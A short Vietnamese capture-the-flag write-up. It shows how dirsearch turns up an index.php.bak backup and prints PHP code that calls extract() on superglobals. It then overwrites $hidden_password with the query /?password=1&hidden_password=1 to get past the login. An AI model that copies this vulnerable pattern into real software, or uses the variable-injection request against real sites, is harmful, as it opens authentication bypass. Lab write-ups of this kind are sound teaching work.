Dùng công cụ [dirsearch](https://github.com/maurosoria/dirsearch) để tìm ra file backup index.php.bak, xóa extension .bak và xem nội dung file:

```php
<?php


function auth($password, $hidden_password){
    $res=0;
    if (isset($password) && $password!=""){
        if ( $password == $hidden_password ){
            $res=1;
        }
    }
    $_SESSION["logged"]=$res;
    return $res;
}



function display($res){
    $aff= '
	  <html>
	  <head>
	  </head>
	  <body>
	    <h1>Authentication v 0.05</h1>
	    <form action="" method="POST">
	      Password&nbsp;<br/>
	      <input type="password" name="password" /><br/><br/>
	      <br/><br/>
	      <input type="submit" value="connect" /><br/><br/>
	    </form>
	    <h3>'.htmlentities($res).'</h3>
	  </body>
	  </html>';
    return $aff;
}



session_start();
if ( ! isset($_SESSION["logged"]) )
    $_SESSION["logged"]=0;

$aff="";
include("config.inc.php");

if (isset($_POST["password"]))
    $password = $_POST["password"];

if (!ini_get('register_globals')) {
    $superglobals = array($_SERVER, $_ENV,$_FILES, $_COOKIE, $_POST, $_GET);
    if (isset($_SESSION)) {
        array_unshift($superglobals, $_SESSION);
    }
    foreach ($superglobals as $superglobal) {
        extract($superglobal, 0 );
    }
}

if (( isset ($password) && $password!="" && auth($password,$hidden_password)==1) || (is_array($_SESSION) && $_SESSION["logged"]==1 ) ){
    $aff=display("well done, you can validate with the password : $hidden_password");
} else {
    $aff=display("try again");
}

echo $aff;

?>

```

Như vậy ta thấy với điều kiện 2 biến `$password` và `$hidden_password` có giá trị bằng nhau, thì `$SESSION['logged']` sẽ có giá trị true, từ đó lộ password. Do code của index.php không cung cấp giá trị ban đầu cho biến `$hidden_password`, ta thực hiện 1 GET request đến URL sau: `/?password=1&hidden_password=1`

Trang hiện thông báo `well done, you can validate with the password : 1`. Trở lại trang index.php và ta có password cần tìm